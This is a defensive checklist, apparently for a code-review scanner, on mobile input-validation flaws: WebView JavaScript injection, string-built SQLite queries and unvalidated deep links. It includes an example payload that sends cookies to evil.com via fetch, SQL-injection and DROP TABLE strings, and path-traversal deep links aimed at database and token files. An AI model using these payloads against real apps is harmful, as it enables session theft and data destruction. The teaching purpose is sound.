# Check — Mobile input validation (WebView JS injection, raw SQLite, unvalidated deep links)

**What you're looking for:** the mobile-specific places where data the app *received from outside* — a deep-link parameter someone tapped, a field that came back from your server, an `Intent` extra another app sent, text the user typed — gets used as a **command** instead of staying **data**. Three sinks in particular:

1. **WebView JavaScript injection** — the app builds a string and runs it inside its in-app browser (`loadUrl("javascript:...")`, `evaluateJavascript(...)`, `loadData(...)`, iOS `evaluateJavaScript(...)`). If any piece of that string came from untrusted input, the attacker now runs JavaScript inside your app's web context — reading what's on screen, the session it holds, calling your JS bridge.
2. **Raw string-concatenated local SQLite** — the app queries its on-device database (`rawQuery`/`execSQL` with `+`, FMDB/GRDB raw SQL with string interpolation) by gluing values into the SQL text instead of binding them. Same SQL-injection bug as the web, just against the local DB.
3. **Unvalidated deep links / intent extras / `NSUserActivity`** — a value that arrived via a `myapp://` link, an Android `Intent` extra, a universal/app link, or a handoff activity is used *raw* as a file path, a URL to open, or a SQL/identifier — with no check that it's the shape you expected.

This is the **input-validation** sibling of two other checks. The web-injection module (`injection.md`) covers SQL/XSS/command on the *server*. The mobile-leaks module (`mobile.md`) covers secrets, cleartext, insecure storage, exports, and logs. **This module is the gap between them:** mobile sinks where *external input* drives a WebView, the local SQLite DB, or a path/URL — the stuff a server-side scanner never sees and the leaks scanner doesn't look for.

Why mobile is its own thing here: on a phone, "untrusted input" includes a whole category the web doesn't have. **Any app on the device, and any link anywhere, can hand your app input.** A deep link is a public front door — a malicious app, a webpage, a QR code, or an SMS can fire `myapp://...` at you with any payload it wants. Treat everything that crosses that boundary as attacker-controlled.

Applies to native (Swift/Kotlin/Java) and cross-platform (Flutter, React Native, Expo, Capacitor) alike — they all expose the same three sinks.

## How to scan

You're reading the repo. Grep for the sink shapes, then **trace one step back** to confirm the value is untrusted (came from a deep link, an intent extra, a server response, or a text field) and not a fixed in-app constant.

```bash
# ── 1. WebView JS built from a string (Android: Kotlin/Java) ──────────
# evaluateJavascript / loadUrl("javascript:...") / loadData with concatenation
grep -rEn --exclude-dir={node_modules,Pods,build,.git,DerivedData,.dart_tool} \
  --include='*.kt' --include='*.java' \
  -E 'evaluateJavascript\s*\(|loadUrl\s*\(\s*"javascript:|loadData\s*\(|loadDataWithBaseURL\s*\(' \
  . 2>/dev/null

# ── WebView JS (iOS: Swift/ObjC) ──────────────────────────────────────
grep -rEn --exclude-dir={Pods,build,DerivedData,.git} \
  --include='*.swift' --include='*.m' \
  -E 'evaluateJavaScript\s*\(|callAsyncJavaScript\s*\(|loadHTMLString\s*\(' \
  . 2>/dev/null

# ── WebView JS (Flutter) — webview_flutter / flutter_inappwebview ─────
grep -rEn --include='*.dart' --exclude-dir=.dart_tool \
  -E 'runJavaScript(Returning)?\s*\(|evaluateJavascript\s*\(|loadHtmlString\s*\(|loadData\s*\(' \
  . 2>/dev/null

# ── WebView JS (React Native) — injectedJavaScript / injectJavaScript ─
grep -rEn --exclude-dir=node_modules \
  --include='*.tsx' --include='*.jsx' --include='*.ts' --include='*.js' \
  -E 'injectedJavaScript|injectedJavaScriptBeforeContentLoaded|injectJavaScript\s*\(' \
  . 2>/dev/null

# ── 2. Raw / concatenated local SQLite (Android) ─────────────────────
# rawQuery / execSQL with "+" concatenation instead of bound args
grep -rEn --include='*.kt' --include='*.java' \
  -E '(rawQuery|execSQL)\s*\([^)]*(\+|\$\{|\" *\+ *)' \
  . 2>/dev/null

# Room @Query / @RawQuery with string building (the rare unsafe Room path)
grep -rEn --include='*.kt' --include='*.java' \
  -E '@RawQuery|SimpleSQLiteQuery\s*\([^)]*\+' \
  . 2>/dev/null

# ── Raw SQLite (iOS — FMDB / GRDB / sqlite3 C API) ───────────────────
# String-interpolated SQL instead of "?" placeholders + args
grep -rEn --include='*.swift' --include='*.m' \
  -E '(executeQuery|executeUpdate)\s*\(\s*"[^"]*\\\(|sqlite3_exec\s*\(|"\s*SELECT[^"]*\\\(|"\s*INSERT[^"]*\\\(' \
  . 2>/dev/null

# ── Raw SQLite (Flutter — sqflite, drift raw) ────────────────────────
grep -rEn --include='*.dart' --exclude-dir=.dart_tool \
  -E '(rawQuery|rawInsert|rawUpdate|rawDelete|customStatement|execute)\s*\(\s*[^)]*\$' \
  . 2>/dev/null

# ── Raw SQLite (React Native — expo-sqlite / react-native-sqlite) ────
grep -rEn --exclude-dir=node_modules \
  --include='*.ts' --include='*.js' --include='*.tsx' \
  -E '(execAsync|runAsync|getAllAsync|executeSql|transaction)\s*\([^)]*(`[^`]*\$\{|"\s*SELECT[^"]*"\s*\+)' \
  . 2>/dev/null

# ── 3. Deep-link / intent / NSUserActivity inputs reaching a sink ────
# Android — reading intent extras + deep-link URI data
grep -rEn --include='*.kt' --include='*.java' \
  -E 'intent\.(data|getData\(\)|extras|getStringExtra|getStringExtra\(|getParcelableExtra)|getQueryParameter\s*\(' \
  . 2>/dev/null

# iOS — universal links / custom URL scheme / Handoff
grep -rEn --include='*.swift' --include='*.m' \
  -E 'openURL|continue userActivity|NSUserActivity|URLComponents\(|\.queryItems|application\(.*open url' \
  . 2>/dev/null

# Flutter — uni_links / go_router / app_links / GoRouterState params
grep -rEn --include='*.dart' --exclude-dir=.dart_tool \
  -E 'uriLinkStream|getInitialUri|onGenerateRoute|state\.(uri|pathParameters|queryParameters)|Uri\.parse' \
  . 2>/dev/null

# React Native — Linking.getInitialURL / addEventListener('url')
grep -rEn --exclude-dir=node_modules \
  --include='*.ts' --include='*.js' --include='*.tsx' \
  -E 'Linking\.(getInitialURL|addEventListener)|useURL\(|expo-linking|Linking\.parse' \
  . 2>/dev/null
```

Also worth opening directly:
- **`AndroidManifest.xml`** — every `<intent-filter>` with a `<data android:scheme="...">` is a deep-link entry point. The Activity behind it receives attacker-shaped input.
- **iOS `Info.plist`** — `CFBundleURLSchemes` (custom schemes) + the **Associated Domains** entitlement (`applinks:`) mark the universal-link / deep-link handlers.
- The router config (`go_router` routes, React Navigation linking config, `react-native` `Linking` setup) — this is where deep-link params get parsed and handed to screens.

After every grep hit, the deciding move is the **back-trace**: does the value flowing into the sink originate from `intent.getStringExtra(...)`, `intent.data`, `uri.getQueryParameter(...)`, `userActivity.webpageURL`, `state.queryParameters[...]`, `route.params`, a `<TextInput>` / `UITextField` / `TextField`, or a field off a network response? If yes → real finding. If it's a hardcoded constant, a `R.string` resource, or a value your own code computed → not a finding.

## The dangerous patterns

### Pattern 1 — WebView JavaScript built from untrusted input (HIGH, CRITICAL if a JS bridge is exposed)

```kotlin
// ❌ Android — deep-link param dropped straight into JS that runs in the WebView
val name = intent.data?.getQueryParameter("name")          // attacker-controlled
webView.evaluateJavascript("showGreeting('$name')", null)
// or the older form:
webView.loadUrl("javascript:setUser('$name')")
```
```swift
// ❌ iOS — server field or deep-link value concatenated into JS
let msg = userActivity.webpageURL?.queryParam("msg") ?? ""
webView.evaluateJavaScript("renderMessage('\(msg)')")
```
```js
// ❌ React Native — building the injection string from route params
<WebView
  source={{ uri: pageUrl }}
  injectedJavaScript={`window.setUser('${route.params.user}');true;`}
/>
```
```dart
// ❌ Flutter — runJavaScript from a deep-link query value
final note = state.uri.queryParameters['note'] ?? '';
controller.runJavaScript("addNote('$note');");
```

The attacker sends `name = ');fetch('https://evil.com/x?c='+document.cookie);//`. Your concatenation closes the call and appends their code, and it **runs inside your WebView's JavaScript context** — the same context that holds whatever the page loaded, any tokens in `localStorage`, and (the dangerous part) any **JavaScript bridge** you registered. If the app exposes a bridge (`addJavascriptInterface` on Android, `WKScriptMessageHandler` on iOS, `injectedJavaScriptObject` / message handlers in RN/Flutter) that can read contacts, hit native APIs, or return a token, the injected JS calls it directly. That's the jump from "annoying" to "account/device compromise."

**HIGH** as plain DOM/JS injection; **CRITICAL** when a native JS bridge is reachable from that context.

### Pattern 2 — Local SQLite built with string concatenation (HIGH)

```kotlin
// ❌ Android — search text glued into the SQL string
val q = searchInput.text.toString()
db.rawQuery("SELECT * FROM notes WHERE title = '$q'", null)
db.execSQL("DELETE FROM notes WHERE tag = '" + tag + "'")
```
```swift
// ❌ iOS — FMDB / GRDB with interpolation instead of placeholders
let results = db.executeQuery("SELECT * FROM items WHERE name = '\(name)'", values: nil)
try db.execute(sql: "SELECT * FROM items WHERE name = '\(name)'")   // GRDB raw
```
```dart
// ❌ Flutter — sqflite rawQuery with interpolation
await db.rawQuery("SELECT * FROM items WHERE name = '$name'");
```
```js
// ❌ React Native — template literal into the SQL
await db.getAllAsync(`SELECT * FROM items WHERE name = '${name}'`);  // expo-sqlite
```

It's the same SQL injection from the web check, against the **on-device** database. People assume "it's just the local DB, only this user touches it" — but the input often *isn't* this user. It can be a deep-link param, a synced field from your server, or a value from another app. A note title of `' OR '1'='1` dumps the table; `'; DROP TABLE notes;--` wipes it; a `UNION SELECT` can read rows from a table the current screen shouldn't see (other accounts cached on a shared device, secrets the app stored in SQLite). On a multi-tenant or shared-device app this is a real data-disclosure path.

**HIGH** when the concatenated value is untrusted.

### Pattern 3 — Deep-link / intent / activity input used raw as a path, URL, or identifier (HIGH)

```kotlin
// ❌ Android — intent extra used as a file path (path traversal into the app sandbox)
val path = intent.getStringExtra("file")            // any app can send this
val text = File(filesDir, path).readText()          // "../../shared_prefs/auth.xml"

// ❌ deep-link value opened as a URL with zero allowlist (open-redirect / scheme abuse)
val next = intent.data?.getQueryParameter("next")
webView.loadUrl(next!!)                              // "javascript:..." or "file:///..."
```
```swift
// ❌ iOS — universal-link query used straight as the URL to load
func application(_ app: UIApplication, open url: URL, options: ...) -> Bool {
    let target = URLComponents(url: url, ...)?.queryItems?.first { $0.name == "url" }?.value
    webView.load(URLRequest(url: URL(string: target!)!))   // unvalidated
}
```
```dart
// ❌ Flutter — deep-link param used as the navigation target / file name
final doc = state.uri.queryParameters['doc'];
final file = File('${dir.path}/$doc');               // "../" escapes the dir
```

A deep link is **a public, unauthenticated entry point.** Any app, webpage, QR code, or message can fire `myapp://open?file=../../databases/app.db` or `myapp://go?next=javascript:...` or `myapp://go?next=file:///etc/...` at your handler. Used raw:
- **as a file path** → directory traversal: read or overwrite files in your app sandbox (the SQLite DB, the prefs holding tokens).
- **as a URL to load in a WebView** → `javascript:`/`file:`/`data:` scheme abuse (loops back into Pattern 1) or an open-redirect that phishes the user under your app's brand.
- **as a SQL value / identifier** → feeds Pattern 2.

**HIGH.** The fix is to **validate at the boundary** — the moment the value arrives from the link/intent/activity, before it touches any sink.

## The fixes — show these, with code

**WebView → never build JS from untrusted strings. Pass data over the bridge, or JSON-encode + bind.**

```kotlin
// ✅ Android — let the JSON serializer escape it; never hand-concatenate into JS
val payload = JSONObject().put("name", name).toString()   // safely quoted/escaped
webView.evaluateJavascript("showGreeting($payload.name)", null)
// Better: pass data via a typed bridge / postMessage, and have the PAGE render it as text.
```
```js
// ✅ React Native — post a message, let the page set textContent (no HTML/JS building)
webviewRef.current?.postMessage(JSON.stringify({ user: route.params.user }));
// in-page handler: el.textContent = JSON.parse(e.data).user;  // text, not code
```
- Only load **trusted, app-controlled** URLs in the WebView, and prefer rendering data **as text** (`textContent`) over building markup or JS.
- If you must expose a JS bridge, treat every message from the page as untrusted: validate type/shape, allowlist the methods it can call, and never let it pass a value straight into a native sink.

**SQLite → bind parameters; never concatenate.**

```kotlin
// ✅ Android — bound args, the "?" placeholder
db.rawQuery("SELECT * FROM notes WHERE title = ?", arrayOf(q))
db.delete("notes", "tag = ?", arrayOf(tag))               // or the typed delete()
```
```swift
// ✅ iOS — FMDB with the values array; GRDB with StatementArguments
db.executeQuery("SELECT * FROM items WHERE name = ?", values: [name])
try Item.filter(Column("name") == name).fetchAll(db)      // GRDB query builder
```
```dart
// ✅ Flutter — sqflite with whereArgs / the ? placeholder
await db.query('items', where: 'name = ?', whereArgs: [name]);
await db.rawQuery('SELECT * FROM items WHERE name = ?', [name]);
```
```js
// ✅ React Native — bound parameters as the args array
await db.getAllAsync('SELECT * FROM items WHERE name = ?', [name]);
```

The placeholder (`?`) keeps the user value as pure data — it can never become part of the SQL. For a column/table name (which can't be parameterized), allowlist it: `val col = if (sort in setOf("name","date")) sort else "name"`.

**Deep links / intents → validate at the boundary, allowlist the shape, never use raw.**

```kotlin
// ✅ Android — validate as the exact thing you expect before using it
val raw = intent.getStringExtra("file") ?: return
val name = File(raw).name                                  // strip any path components
require(name.matches(Regex("^[A-Za-z0-9_.-]+$")))          // allowlist the charset
val safe = File(filesDir, name).canonicalFile
require(safe.canonicalPath.startsWith(filesDir.canonicalPath))  // stays in sandbox

// ✅ a "next" URL must be on YOUR host + an http(s) scheme — no javascript:/file:
val next = Uri.parse(intent.data?.getQueryParameter("next") ?: "")
if (next.scheme in setOf("https") && next.host == "app.myapp.com") webView.loadUrl(next.toString())
```
```swift
// ✅ iOS — same idea: parse, allowlist scheme + host, reject the rest
guard let comps = URLComponents(url: url, resolvingAgainstBaseURL: false),
      comps.scheme == "https", comps.host == "app.myapp.com" else { return false }
```

Rules of thumb at the deep-link boundary: parse with the platform URL/URI type (don't string-split); **allowlist** the scheme (`https` only — reject `javascript:`, `file:`, `data:`), the host, and the path shape; for file names strip path components and canonicalize to confirm the result stays in your sandbox; for IDs match a strict regex. Validate **once, at entry** — then the rest of the screen can trust it.

## Report a finding as

**Title:** "A tapped link can run code inside your app's in-app browser"

(adapt per pattern: SQLite → "Your search box can read or wipe the app's local database"; deep link → "Any app or link can make your app open a file it shouldn't / load a malicious page")

**Detail:**
> `app/src/main/java/com/myapp/GreetActivity.kt:41` takes a value out of the deep link and drops it straight into JavaScript that runs in your in-app WebView:
> ```kotlin
> val name = intent.data?.getQueryParameter("name")
> webView.evaluateJavascript("showGreeting('$name')", null)
> ```
> Here's the part founders miss: **a deep link is a public front door.** Any other app on the phone, any webpage, a QR code, or even an SMS can fire `myapp://greet?name=...` at your app with *any* value it wants — it's not your code choosing what `name` is.
>
> **What can go wrong:** Someone sends `myapp://greet?name=');fetch('https://evil.com/x?c='+document.cookie);//`. Your code glues that in, the call closes early, and the attacker's JavaScript runs inside your app's web view — where it can read whatever the page is showing, any token in the page's storage, and (the scary case) call any native bridge you've wired up. If that bridge can reach contacts, files, or an auth token, a single tap on a crafted link is an account or device compromise.
>
> **What to do tonight:**
> 1. **Stop building JS from outside input.** Either JSON-encode the value so it's safely quoted, or — better — pass it to the page over `postMessage` / your bridge and have the page render it as **text** (`element.textContent = value`), never as code or HTML:
>    ```kotlin
>    val payload = org.json.JSONObject().put("name", name).toString()
>    webView.evaluateJavascript("showGreeting($payload.name)", null)
>    ```
> 2. **Validate the deep-link value the moment it arrives** — allowlist the shape you expect (`^[A-Za-z0-9 _.-]+$` for a name), and reject anything else before it reaches any sink.
> 3. Grep the rest of the app for `evaluateJavascript` / `loadUrl("javascript:` / `injectedJavaScript` / `runJavaScript` and check each one the same way. Where there's one, there are usually more.
> 4. Verify: launch the app with the crafted link via `adb shell am start -a android.intent.action.VIEW -d "myapp://greet?name=test')//"` and confirm it no longer breaks out (no JS error, no extra call fires).

Repeat the report block for each distinct sink you found, swapping in the right story:
- **Raw SQLite:** "`NotesDb.kt:58` builds the query for your search box by gluing the typed text into the SQL string. Someone typing `' OR '1'='1` dumps the whole notes table; `'; DROP TABLE notes;--` wipes it. This isn't only 'this user's own data' — the same query often runs on values that came from a deep link or your server, and on a shared device it can read another account's cached rows." Fix: use the `?` placeholder with a bound-args array.
- **Unvalidated deep link as path/URL:** "`OpenActivity.kt:33` takes the `file` value out of a deep link and reads `File(filesDir, file)` with no checks. Any app can send `myapp://open?file=../../databases/app.db` and walk out of the folder you intended into your app's database or token files." Fix: strip path components, allowlist the charset, and canonicalize to confirm the result stays inside your sandbox; for `next`/`url` params, allowlist scheme (`https` only) + host before loading.

## What NOT to flag (false-positive guards — read this before reporting)

This check fires on a lot of *normal* mobile code. Most WebView calls, most local-DB queries, and most deep-link handlers are fine. Trace the value to its source before reporting — **no untrusted source, no finding.**

- **WebView content loaded from a fixed bundled asset.** `loadUrl("file:///android_asset/help.html")`, `loadUrl("https://app.myapp.com/...")` to your own host, or `evaluateJavascript` running a **constant** string with no outside variable. That's just driving your own UI — safe.
- **`evaluateJavascript` / `injectedJavaScript` with a hardcoded or JSON-encoded payload.** If the JS is a literal, or the value is wrapped through `JSONObject` / `JSON.stringify` / `JSONStringify` before it goes in, it's already escaped. Safe. Only flag hand-built string concatenation of an *outside* value.
- **Parameterized / query-builder SQLite.** `rawQuery("... WHERE id = ?", arrayOf(id))`, `db.query('items', where: 'x = ?', whereArgs: [x])`, `getAllAsync(sql, [x])`, Room `@Query` with `:named` bind params, GRDB/drift/Realm/Core Data query APIs, `Item.filter(Column("name") == name)` — these all bind, so the value can't become SQL. **Safe. Don't flag.** Room's compile-time-checked `@Query` is safe even though the SQL is a string — the `:param` binds. (Only `@RawQuery` + `SimpleSQLiteQuery` built with `+` is risky.)
- **SQL strings interpolated with developer constants, not user input.** `"SELECT * FROM ${tableName}"` where `tableName` is an enum/allowlisted constant your code set, or interpolating a `BuildConfig`/resource value, is not injection. Only the user/deep-link/server path matters.
- **Deep-link values that are validated before use.** If the value goes through an allowlist regex, a scheme/host check, `File(raw).name` + canonical-path containment, an enum lookup, or a router that only matches known routes (and rejects the rest) — it's handled. The presence of `getQueryParameter` / `Linking.parse` / `state.uri` is *normal*; the bug is only when the raw value reaches a path/URL/SQL sink unchecked.
- **Deep-link values used as plain display text or non-sensitive UI state.** A `name`/`tab`/`campaign` param shown as a label, set as `textContent`, or used to pick a tab is fine — that's what deep links are for. Risk appears only at the path/URL/WebView-JS/SQL sinks.
- **`http(s)` URLs loaded in a WebView after a host allowlist.** Loading a deep-link `next` URL *after* confirming `scheme == "https"` and `host` is yours is the correct pattern, not a finding.
- **Test files, fixtures, sample/demo screens.** Paths under `androidTest/`, `*Test.kt`, `__tests__/`, `*.spec.*`, `example/`, fixtures with literal values aren't a production attack surface.
- **`postMessage` / typed bridges that pass data, not code.** Sending JSON to the page and rendering it as text is the *recommended* fix — don't flag the safe pattern. Only flag a bridge that takes an untrusted message and passes it straight into a native sink (file, SQL, another JS eval) without validating it.

When in doubt, the deciding question is: **"could another app, a link, a QR code, or a server response put a crafted string here — and does that string then become JavaScript, SQL, or a file path/URL the app acts on?"** If yes → flag it (HIGH; CRITICAL if it reaches a native JS bridge). If the input is validated at the boundary, bound as a SQL parameter, JSON-encoded before the WebView, or just shown as text → at most an INFO heads-up.
